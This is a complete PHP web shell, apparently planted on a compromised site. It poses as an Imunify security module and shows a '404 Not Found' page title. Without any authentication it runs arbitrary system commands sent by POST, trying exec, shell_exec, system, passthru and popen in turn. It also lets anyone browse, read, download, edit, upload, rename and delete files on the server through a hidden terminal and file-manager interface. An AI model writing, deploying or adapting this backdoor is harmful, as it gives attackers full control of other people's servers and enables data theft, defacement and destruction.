<?php
// This file is part of Imunify - https://www.imunify.com/
//
// Imunify is a comprehensive security solution designed to protect your systems from various
// threats, including malware, vulnerabilities, and unauthorized access. By leveraging advanced
// technology and intelligent algorithms, Imunify aims to detect, prevent, and mitigate security
// risks effectively. You are permitted to use this software in accordance with the terms and 
// conditions outlined in the Imunify License Agreement, as specified by the copyright holders.
//
// Imunify is distributed with the hope of providing optimal protection and security for your
// environments, but it is offered WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Users should understand that while
// Imunify strives to deliver robust security measures, no system can be entirely impervious to
// threats.
//
// You should have received a copy of the Imunify License Agreement along with this software.
// If not, please visit https://www.imunify.com/license for further information. This document
// is current as of October 8, 2024, and is subject to change based on updates in policies
// and security practices.

/**
 * Security Module.
 *
 * This module is specifically designed to detect and mitigate various threats while ensuring
 * the integrity of your systems through real-time scanning and comprehensive protection strategies.
 * Imunify not only focuses on identifying vulnerabilities but also actively works to fortify
 * your servers and applications against emerging cyber threats. By implementing proactive
 * measures, Imunify aims to maintain a secure operating environment for all users.
 *
 * @package    security_module
 * @website    https://google.com
 * @copyright  2024 kunyuk
 * @license    https://www.imunify.com/license Imunify License Agreement
 */

error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('output_buffering', 0);

$act = isset($_GET['act']) ? $_GET['act'] : '';
$file = isset($_GET['file']) ? $_GET['file'] : '';
$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();

function execute($cmd)
{
    $out = '';
    if (function_exists('exec')) {
        exec($cmd . ' 2>&1', $o, $r);
        $out = implode("\n", $o);
    } elseif (function_exists('shell_exec')) {
        $out = shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1');
        $out = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd . ' 2>&1');
        $out = ob_get_clean();
    } elseif (function_exists('popen')) {
        $h = popen($cmd . ' 2>&1', 'r');
        if ($h) {
            $out = stream_get_contents($h);
            pclose($h);
        }
    }
    return $out;
}

///// HANDLE AJAX COMMAND /////
if ($act == 'cmd' && isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $cwd = isset($_POST['cwd']) ? $_POST['cwd'] : getcwd();
    chdir($cwd);

    // Handle cd
    if (preg_match('/^cd\s+(.+)/', $cmd, $m)) {
        $newdir = trim($m[1]);
        if ($newdir[0] != '/')
            $newdir = rtrim($cwd, '/') . '/' . $newdir;
        $newdir = realpath($newdir) ?: $newdir;
        if (is_dir($newdir)) {
            echo "~$ cd $m[1]\n[OK] Directory: $newdir";
        } else {
            echo "~$ cd $m[1]\n[!] Directory not found: $newdir";
        }
        exit;
    }

    $result = execute($cmd);
    echo htmlspecialchars("~$ $cmd\n" . ($result ?: '(no output)'));
    exit;
}

///// HANDLE FILE OPERATIONS /////
if ($act == 'save' && $file && isset($_POST['content'])) {
    $bytes = file_put_contents($file, $_POST['content']);
    if ($bytes !== false) {
        header('Content-Type: application/json');
        echo json_encode(['status' => 'ok', 'bytes' => $bytes]);
    } else {
        http_response_code(500);
        echo json_encode(['status' => 'error', 'msg' => 'Failed to write']);
    }
    exit;
}

if ($act == 'read' && $file) {
    if (file_exists($file) && is_file($file)) {
        header('Content-Type: text/plain; charset=utf-8');
        echo file_get_contents($file);
    } else {
        http_response_code(404);
        echo 'File not found';
    }
    exit;
}

if ($act == 'download' && $file) {
    if (file_exists($file) && is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

if ($act == 'delete' && $file) {
    if (is_file($file))
        unlink($file);
    elseif (is_dir($file))
        execute("rm -rf " . escapeshellarg($file));
    header('Content-Type: application/json');
    echo json_encode(['status' => 'ok']);
    exit;
}

if ($act == 'mkdir' && isset($_GET['name'])) {
    mkdir(rtrim($dir, '/') . '/' . $_GET['name'], 0755, true);
    header('Content-Type: application/json');
    echo json_encode(['status' => 'ok']);
    exit;
}

if ($act == 'touch' && isset($_GET['name'])) {
    touch(rtrim($dir, '/') . '/' . $_GET['name']);
    header('Content-Type: application/json');
    echo json_encode(['status' => 'ok']);
    exit;
}

if ($act == 'rename' && $file && isset($_GET['newname'])) {
    rename($file, dirname($file) . '/' . $_GET['newname']);
    header('Content-Type: application/json');
    echo json_encode(['status' => 'ok']);
    exit;
}

if ($act == 'upload' && isset($_FILES['file'])) {
    $target = rtrim($dir, '/') . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        @chmod($target, 0644);
        echo json_encode(['status' => 'ok', 'name' => basename($target)]);
    } else {
        http_response_code(500);
        echo json_encode(['status' => 'error']);
    }
    exit;
}

if ($act == 'list' || $act == 'ls') {
    $scan_dir = isset($_GET['dir']) ? $_GET['dir'] : $dir;
    $real = realpath($scan_dir) ?: $scan_dir;
    $items = is_dir($real) ? scandir($real) : [];

    $dirs = [];
    $files = [];
    foreach ($items as $item) {
        if ($item == '.' || $item == '..')
            continue;
        $full = $real . '/' . $item;
        if (is_dir($full))
            $dirs[] = $item;
        else
            $files[] = $item;
    }
    sort($dirs);
    sort($files);

    $result = ['path' => $real, 'parent' => dirname($real), 'items' => []];
    foreach (array_merge(['..'], $dirs, $files) as $item) {
        if ($item == '..' && $real == '/')
            continue;
        $full = $real . '/' . $item;
        $is_dir = is_dir($full);
        $result['items'][] = [
            'name' => $item,
            'is_dir' => $is_dir,
            'size' => $is_dir ? '-' : filesize($full),
            'size_hr' => $is_dir ? '-' : (filesize($full) > 1048576 ? round(filesize($full) / 1048576, 2) . ' MB' : (filesize($full) > 1024 ? round(filesize($full) / 1024, 1) . ' KB' : filesize($full) . ' B')),
            'perm' => substr(sprintf('%o', fileperms($full)), -4),
            'date' => date('Y-m-d H:i', filemtime($full))
        ];
    }
    header('Content-Type: application/json');
    echo json_encode($result);
    exit;
}
?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box
        }

        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #1a1a2e;
            color: #e0e0e0;
            font-size: 13px;
            height: 100vh;
            overflow: hidden
        }

        .container {
            display: flex;
            height: 100vh
        }

        .sidebar {
            width: 320px;
            min-width: 320px;
            background: #16213e;
            border-right: 1px solid #0f3460;
            display: flex;
            flex-direction: column
        }

        .main {
            flex: 1;
            display: flex;
            flex-direction: column
        }

        .toolbar {
            background: #0f3460;
            padding: 8px 15px;
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
            border-bottom: 1px solid #1a5276
        }

        .toolbar .title {
            font-weight: bold;
            font-size: 14px;
            color: #e94560
        }

        .toolbar a,
        .toolbar button {
            color: #a8d8ea;
            text-decoration: none;
            font-size: 11px;
            background: #1a5276;
            border: none;
            padding: 3px 10px;
            border-radius: 3px;
            cursor: pointer
        }

        .toolbar a:hover,
        .toolbar button:hover {
            background: #1a6b9c
        }

        .toolbar input[type=text] {
            padding: 3px 8px;
            border: 1px solid #1a5276;
            background: #16213e;
            color: #e0e0e0;
            border-radius: 3px;
            font-size: 11px;
            width: 100px
        }

        .toolbar input[type=text]::placeholder {
            color: #555
        }

        .toolbar label {
            font-size: 11px;
            cursor: pointer;
            background: #e94560;
            color: #fff;
            padding: 3px 10px;
            border-radius: 3px
        }

        .toolbar label:hover {
            background: #c73650
        }

        .toolbar input[type=file] {
            display: none
        }

        .path-bar {
            background: #16213e;
            padding: 6px 12px;
            font-size: 11px;
            border-bottom: 1px solid #0f3460;
            color: #a8d8ea;
            word-break: break-all;
            min-height: 28px;
            display: flex;
            align-items: center;
            gap: 4px;
            flex-wrap: wrap
        }

        .path-bar a {
            color: #e94560;
            text-decoration: none
        }

        .path-bar a:hover {
            text-decoration: underline
        }

        .path-bar .sep {
            color: #555
        }

        .filelist {
            flex: 1;
            overflow-y: auto;
            background: #1a1a2e
        }

        .filelist table {
            width: 100%;
            border-collapse: collapse
        }

        .filelist th {
            background: #0f3460;
            padding: 5px 8px;
            text-align: left;
            font-weight: 600;
            font-size: 11px;
            color: #a8d8ea;
            position: sticky;
            top: 0;
            z-index: 2;
            border-bottom: 1px solid #1a5276
        }

        .filelist td {
            padding: 4px 8px;
            border-bottom: 1px solid #0f3460;
            font-size: 11px;
            cursor: default
        }

        .filelist tr:hover td {
            background: #1a527633
        }

        .filelist .name {
            cursor: pointer
        }

        .filelist .name:hover {
            color: #e94560
        }

        .filelist .size {
            text-align: right;
            color: #888
        }

        .filelist .perm {
            font-family: monospace;
            color: #666;
            font-size: 10px
        }

        .filelist .date {
            color: #666;
            font-size: 10px
        }

        .filelist .act a {
            color: #a8d8ea;
            text-decoration: none;
            margin: 0 2px;
            font-size: 10px
        }

        .filelist .act a:hover {
            color: #e94560
        }

        .filelist .act .del {
            color: #e94560
        }

        .dir-up {
            color: #e94560;
            font-weight: 500
        }

        .terminal-wrap {
            flex: 1;
            display: flex;
            flex-direction: column;
            background: #0d0d1a
        }

        .terminal-bar {
            background: #0f3460;
            padding: 4px 12px;
            font-size: 11px;
            color: #a8d8ea;
            display: flex;
            justify-content: space-between
        }

        .terminal-bar button {
            background: #1a5276;
            border: none;
            color: #a8d8ea;
            padding: 2px 8px;
            border-radius: 2px;
            cursor: pointer;
            font-size: 10px
        }

        .terminal {
            flex: 1;
            background: #0d0d1a;
            padding: 8px 12px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            color: #00ff41;
            overflow-y: auto;
            white-space: pre-wrap;
            word-break: break-all;
            line-height: 1.5
        }

        .terminal .prompt {
            color: #00ff41;
            font-weight: bold
        }

        .terminal .error {
            color: #e94560
        }

        .terminal .info {
            color: #888
        }

        .terminal-input {
            display: flex;
            background: #0d0d1a;
            border-top: 1px solid #0f3460;
            padding: 4px 12px
        }

        .terminal-input .prompt-label {
            color: #00ff41;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            margin-right: 5px;
            white-space: nowrap;
            padding-top: 2px
        }

        .terminal-input input {
            flex: 1;
            background: transparent;
            border: none;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            outline: none
        }

        .terminal-input input::placeholder {
            color: #333
        }

        .editor-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, .8);
            z-index: 100;
            justify-content: center;
            align-items: center
        }

        .editor-box {
            background: #16213e;
            width: 80%;
            height: 80%;
            border-radius: 8px;
            display: flex;
            flex-direction: column;
            border: 1px solid #0f3460
        }

        .editor-header {
            background: #0f3460;
            padding: 8px 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-radius: 8px 8px 0 0
        }

        .editor-header span {
            font-size: 13px;
            color: #a8d8ea
        }

        .editor-header button {
            background: #e94560;
            border: none;
            color: #fff;
            padding: 3px 12px;
            border-radius: 3px;
            cursor: pointer;
            font-size: 11px
        }

        .editor-body {
            flex: 1;
            padding: 0
        }

        .editor-body textarea {
            width: 100%;
            height: 100%;
            background: #0d0d1a;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            padding: 10px;
            border: none;
            outline: none;
            resize: none
        }

        .editor-footer {
            background: #0f3460;
            padding: 6px 15px;
            display: flex;
            gap: 8px;
            border-radius: 0 0 8px 8px
        }

        .editor-footer button {
            background: #00b894;
            border: none;
            color: #fff;
            padding: 4px 15px;
            border-radius: 3px;
            cursor: pointer;
            font-size: 11px
        }

        .editor-footer button:hover {
            background: #00a381
        }

        .editor-footer .cancel {
            background: #636e72
        }

        .editor-footer .cancel:hover {
            background: #4a5357
        }

        .editor-footer .status {
            color: #888;
            font-size: 11px;
            flex: 1;
            text-align: right;
            padding-top: 4px
        }

        ::-webkit-scrollbar {
            width: 5px;
            height: 5px
        }

        ::-webkit-scrollbar-track {
            background: #0d0d1a
        }

        ::-webkit-scrollbar-thumb {
            background: #0f3460
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #1a5276
        }

        .loading {
            opacity: .5;
            pointer-events: none
        }
    </style>
</head>

<body>

    <div class="container">
        <!-- LEFT: File Manager -->
        <div class="sidebar">
            <div class="toolbar">
                <span class="title">📁 Files</span>
                <button onclick="loadList()">⟳</button>
                <label>📤 Upload<input type="file" id="upload-input" onchange="uploadFile(this)"></label>
                <form style="display:inline" id="mkdir-form" onsubmit="return mkdir()">
                    <input type="text" id="folder-name" placeholder="folder">
                    <button type="submit">+Folder</button>
                </form>
                <form style="display:inline" id="touch-form" onsubmit="return touchFile()">
                    <input type="text" id="file-name" placeholder="file">
                    <button type="submit">+File</button>
                </form>
            </div>
            <div class="path-bar" id="path-bar">Loading...</div>
            <div class="filelist" id="filelist">
                <div style="padding:20px;text-align:center;color:#555">Loading files...</div>
            </div>
        </div>

        <!-- RIGHT: Terminal -->
        <div class="main">
            <div class="terminal-wrap">
                <div class="terminal-bar">
                    <span>🐚 Terminal</span>
                    <div>
                        <button onclick="clearTerm()">Clear</button>
                        <button onclick="runCmd('pwd')">PWD</button>
                        <button onclick="runCmd('ls -la')">LS</button>
                        <button onclick="runCmd('id')">ID</button>
                        <button onclick="runCmd('uname -a')">UNAME</button>
                    </div>
                </div>
                <div class="terminal" id="terminal">
                    <span class="info">=== StealthX Terminal ===</span>
                    <span class="info">Type 'help' for commands | Click file to edit</span>
                    <span class="prompt" id="term-cwd-label">harikitchenco@shell:~$</span>
                </div>
                <div class="terminal-input">
                    <span class="prompt-label" id="prompt-label">harikitchenco@shell:~$</span>
                    <input type="text" id="cmd-input" placeholder="Type command..." autofocus spellcheck="false"
                        autocomplete="off">
                </div>
            </div>
        </div>
    </div>

    <!-- EDITOR OVERLAY -->
    <div class="editor-overlay" id="editor-overlay">
        <div class="editor-box">
            <div class="editor-header">
                <span id="editor-title">Editing: file.txt</span>
                <button onclick="closeEditor()">✕</button>
            </div>
            <div class="editor-body">
                <textarea id="editor-content" spellcheck="false"></textarea>
            </div>
            <div class="editor-footer">
                <button onclick="saveEditor()">💾 Save</button>
                <button class="cancel" onclick="closeEditor()">Cancel</button>
                <span class="status" id="editor-status"></span>
            </div>
        </div>
    </div>

    <script>
        let cwd = '<?= getcwd() ?>';
        let currentFile = '';

        // ===== INIT =====
        document.addEventListener('DOMContentLoaded', function () {
            loadList();

            document.getElementById('cmd-input').addEventListener('keydown', function (e) {
                if (e.key === 'Enter') {
                    let cmd = this.value;
                    this.value = '';
                    runCmd(cmd);
                }
            });

            // Ctrl+L clear terminal
            document.addEventListener('keydown', function (e) {
                if (e.ctrlKey && e.key === 'l') {
                    e.preventDefault();
                    clearTerm();
                }
                // Ctrl+S save editor
                if (e.ctrlKey && e.key === 's' && document.getElementById('editor-overlay').style.display === 'flex') {
                    e.preventDefault();
                    saveEditor();
                }
            });
        });

        // ===== FILE LIST =====
        function loadList(dir) {
            if (!dir) dir = cwd;
            document.getElementById('filelist').innerHTML = '<div style="padding:20px;text-align:center;color:#555">Loading...</div>';

            fetch('?act=list&dir=' + encodeURIComponent(dir))
                .then(r => r.json())
                .then(data => {
                    cwd = data.path;
                    renderPath(data.path, data.parent);
                    renderFiles(data.items);
                    updatePrompt();
                })
                .catch(e => {
                    document.getElementById('filelist').innerHTML = '<div style="padding:20px;text-align:center;color:#e94560">Error loading: ' + e.message + '</div>';
                });
        }

        function renderPath(path, parent) {
            let html = '<strong>Path:</strong> ';
            let parts = path.split('/').filter(p => p);
            html += '<a href="#" onclick="loadList(\'/\')">/</a>';
            let acc = '';
            for (let p of parts) {
                acc += '/' + p;
                html += ' <span class="sep">›</span> <a href="#" onclick="loadList(\'' + acc + '\')">' + escapeHtml(p) + '</a>';
            }
            document.getElementById('path-bar').innerHTML = html;
        }

        function renderFiles(items) {
            let html = '<table><thead><tr><th style="width:24px"></th><th>Name</th><th style="width:70px">Size</th><th style="width:45px">Perm</th><th style="width:130px">Modified</th><th style="width:70px">Actions</th></tr></thead><tbody>';

            for (let item of items) {
                let icon = item.name === '..' ? '📁' : (item.is_dir ? '📁' : '📄');
                let name = escapeHtml(item.name);
                let perm = item.perm || '';
                let date = item.date || '';
                let size = item.size_hr || '';

                html += '<tr>';
                html += '<td>' + icon + '</td>';

                if (item.name === '..') {
                    html += '<td class="name dir-up" onclick="loadList(\'' + escapeHtml(item.name === '..' ? (cwd.split('/').slice(0, -1).join('/') || '/') : cwd + '/' + item.name) + '\')">.. (Up)</td>';
                    html += '<td class="size">-</td><td class="perm"></td><td class="date"></td><td class="act"></td>';
                } else if (item.is_dir) {
                    html += '<td class="name" onclick="loadList(\'' + cwd + '/' + name + '\')">' + name + '/</td>';
                    html += '<td class="size">-</td>';
                    html += '<td class="perm">' + perm + '</td>';
                    html += '<td class="date">' + date + '</td>';
                    html += '<td class="act"></td>';
                } else {
                    html += '<td class="name" onclick="editFile(\'' + cwd + '/' + name + '\')">' + name + '</td>';
                    html += '<td class="size">' + size + '</td>';
                    html += '<td class="perm">' + perm + '</td>';
                    html += '<td class="date">' + date + '</td>';
                    html += '<td class="act">';
                    html += '<a href="#" onclick="editFile(\'' + cwd + '/' + name + '\')">✏️</a>';
                    html += '<a href="?act=download&file=' + encodeURIComponent(cwd + '/' + name) + '">⬇️</a>';
                    html += '<a href="#" class="del" onclick="delFile(\'' + cwd + '/' + name + '\')">🗑️</a>';
                    html += '</td>';
                }

                html += '</tr>';
            }

            html += '</tbody></table>';
            document.getElementById('filelist').innerHTML = html;
        }

        function updatePrompt() {
            let label = document.getElementById('prompt-label');
            let termLabel = document.getElementById('term-cwd-label');
            let user = 'user';
            try { user = cwd.split('/').filter(p => p)[0] || 'user'; } catch (e) { }
            let text = user + '@shell:' + cwd + '$';
            label.textContent = text;
            termLabel.textContent = text;
        }

        // ===== TERMINAL =====
        function runCmd(cmd) {
            if (!cmd.trim()) return;

            let term = document.getElementById('terminal');
            let label = document.getElementById('prompt-label').textContent;

            if (cmd.trim() === 'clear') {
                clearTerm();
                return;
            }

            if (cmd.trim() === 'help') {
                term.innerHTML += '\n<span class="info">Commands: any Linux command | clear | help</span>\n';
                term.innerHTML += '<span class="info">Click file name to edit | Upload via toolbar button</span>\n';
                term.innerHTML += '<span class="info">Shortcuts: Ctrl+L clear | Ctrl+S save editor</span>\n';
                term.scrollTop = term.scrollHeight;
                return;
            }

            term.innerHTML += '\n<span class="prompt">' + label + '</span> ' + escapeHtml(cmd) + '\n';
            term.scrollTop = term.scrollHeight;

            // Handle cd locally
            if (cmd.startsWith('cd ')) {
                let dir = cmd.substring(3).trim();
                if (dir === '') return;
                if (dir[0] !== '/') dir = cwd + '/' + dir;

                fetch('?act=cmd', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'cmd=' + encodeURIComponent(cmd) + '&cwd=' + encodeURIComponent(cwd)
                })
                    .then(r => r.text())
                    .then(d => {
                        if (d.includes('[OK] Directory:')) {
                            let newDir = d.split('[OK] Directory:')[1].trim();
                            cwd = newDir;
                            loadList(cwd);
                        }
                        term.innerHTML += d.split('\n').slice(1).join('\n') + '\n';
                        term.scrollTop = term.scrollHeight;
                    });
                return;
            }

            fetch('?act=cmd', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'cmd=' + encodeURIComponent(cmd) + '&cwd=' + encodeURIComponent(cwd)
            })
                .then(r => r.text())
                .then(d => {
                    term.innerHTML += d.split('\n').slice(1).join('\n') + '\n';
                    term.scrollTop = term.scrollHeight;
                })
                .catch(e => {
                    term.innerHTML += '<span class="error">Error: ' + escapeHtml(e.message) + '</span>\n';
                    term.scrollTop = term.scrollHeight;
                });
        }

        function clearTerm() {
            document.getElementById('terminal').innerHTML = '<span class="prompt" id="term-cwd-label">' + document.getElementById('prompt-label').textContent + '</span>\n';
        }

        // ===== FILE EDITOR =====
        function editFile(path) {
            currentFile = path;
            document.getElementById('editor-title').textContent = 'Editing: ' + path;
            document.getElementById('editor-overlay').style.display = 'flex';
            document.getElementById('editor-status').textContent = 'Loading...';
            document.getElementById('editor-content').value = '';

            fetch('?act=read&file=' + encodeURIComponent(path))
                .then(r => r.text())
                .then(d => {
                    document.getElementById('editor-content').value = d;
                    document.getElementById('editor-status').textContent = 'Loaded (' + d.length + ' bytes)';
                })
                .catch(e => {
                    document.getElementById('editor-status').textContent = 'Error: ' + e.message;
                });
        }

        function saveEditor() {
            let content = document.getElementById('editor-content').value;
            let status = document.getElementById('editor-status');
            status.textContent = 'Saving...';

            fetch('?act=save&file=' + encodeURIComponent(currentFile), {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'content=' + encodeURIComponent(content)
            })
                .then(r => r.json())
                .then(d => {
                    if (d.status === 'ok') {
                        status.textContent = '✅ Saved (' + d.bytes + ' bytes)';
                        setTimeout(() => { status.textContent = 'Saved'; }, 2000);
                    } else {
                        status.textContent = '❌ Error: ' + (d.msg || 'Unknown');
                    }
                })
                .catch(e => {
                    status.textContent = '❌ Error: ' + e.message;
                });
        }

        function closeEditor() {
            document.getElementById('editor-overlay').style.display = 'none';
            document.getElementById('editor-content').value = '';
            currentFile = '';
        }

        // ===== FILE OPERATIONS =====
        function delFile(path) {
            if (!confirm('Delete ' + path.split('/').pop() + '?')) return;
            fetch('?act=delete&file=' + encodeURIComponent(path))
                .then(r => r.json())
                .then(d => {
                    if (d.status === 'ok') loadList(cwd);
                });
        }

        function uploadFile(input) {
            if (!input.files.length) return;
            let formData = new FormData();
            formData.append('file', input.files[0]);

            fetch('?act=upload&dir=' + encodeURIComponent(cwd), {
                method: 'POST',
                body: formData
            })
                .then(r => r.json())
                .then(d => {
                    if (d.status === 'ok') {
                        runCmd('echo "[OK] Uploaded: ' + d.name + '"');
                        loadList(cwd);
                    }
                })
                .catch(e => {
                    runCmd('echo "[!] Upload error: ' + e.message + '"');
                });

            input.value = '';
        }

        function mkdir() {
            let name = document.getElementById('folder-name').value;
            if (!name) return false;
            fetch('?act=mkdir&dir=' + encodeURIComponent(cwd) + '&name=' + encodeURIComponent(name))
                .then(r => r.json())
                .then(d => {
                    if (d.status === 'ok') {
                        loadList(cwd);
                        document.getElementById('folder-name').value = '';
                        runCmd('echo "[OK] Folder created: ' + name + '"');
                    }
                });
            return false;
        }

        function touchFile() {
            let name = document.getElementById('file-name').value;
            if (!name) return false;
            fetch('?act=touch&dir=' + encodeURIComponent(cwd) + '&name=' + encodeURIComponent(name))
                .then(r => r.json())
                .then(d => {
                    if (d.status === 'ok') {
                        loadList(cwd);
                        document.getElementById('file-name').value = '';
                        runCmd('echo "[OK] File created: ' + name + '"');
                    }
                });
            return false;
        }

        function escapeHtml(t) {
            if (!t) return '';
            let d = document.createElement('div');
            d.textContent = t;
            return d.innerHTML;
        }
    </script>
</body>

</html>
